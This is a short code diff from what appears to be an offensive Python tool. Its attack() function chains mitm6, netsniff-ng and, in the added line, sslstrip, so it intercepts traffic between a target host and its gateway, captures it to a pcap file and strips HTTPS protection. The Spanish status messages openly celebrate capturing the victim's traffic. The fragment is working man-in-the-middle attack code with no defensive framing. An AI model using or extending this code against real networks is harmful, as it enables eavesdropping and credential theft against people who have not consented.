@@ -72,7 +72,7 @@ def attack():
 	banner2()
 	print(G+"[>] "+W+"Tomate un coffee mientras comemos trafico "+G+":)")
 	print(B+"[*] "+W+"Abriendo trafico entre "+parse.target+" y "+parse.gateway)
-	os.system("xterm -geometry 100x30 -e 'sudo mitm6 --ignore-nofqdn -l "+parse.localdomain+" -b "+parse.target+" -i "+parse.interface+"' | xterm -geometry 120x30 -e 'sudo netsniff-ng --in "+parse.interface+" --out "+export+"'")
+	os.system("xterm -geometry 100x30 -e 'sudo mitm6 --ignore-nofqdn -l "+parse.localdomain+" -b "+parse.target+" -i "+parse.interface+"' | xterm -geometry 120x30 -e 'sudo netsniff-ng --in "+parse.interface+" --out "+export+"' | xterm -geometry 100x30 -e 'sslstrip -p "+parse.port+"'")
 	print(B+"[*] "+W+"Escuchando trafico generalizado en pcap y exportandolo como "+export)
 
 # Argumentos
